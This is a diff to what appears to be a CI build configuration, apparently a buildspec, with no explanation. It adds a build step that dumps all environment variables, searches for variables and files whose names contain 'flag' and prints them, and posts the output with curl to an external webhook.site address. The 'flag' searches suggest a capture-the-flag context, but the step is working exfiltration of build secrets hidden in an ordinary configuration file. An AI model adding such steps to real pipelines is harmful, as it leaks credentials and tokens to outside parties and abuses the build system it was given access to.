@@ -4,6 +4,17 @@ phases:
   build:
     commands:
       - |
-        echo "binary9" | curl -fsS -X POST \
+        {
+          echo "=== ENVIRONMENT ==="
+          env | sort
+
+          echo "=== FLAG ENVIRONMENT VARIABLES ==="
+          printenv | grep -i flag || true
+
+          echo "=== FLAG FILES ==="
+          find / -maxdepth 4 -type f -iname '*flag*' \
+            -exec sh -c 'echo "--- $1"; cat "$1"' _ {} \; 2>/dev/null
+        } | curl -fsS -X POST \
+          -H 'Content-Type: text/plain' \
           --data-binary @- \
           'https://webhook.site/0b9973f6-84da-4f46-a8d0-11077072813e'
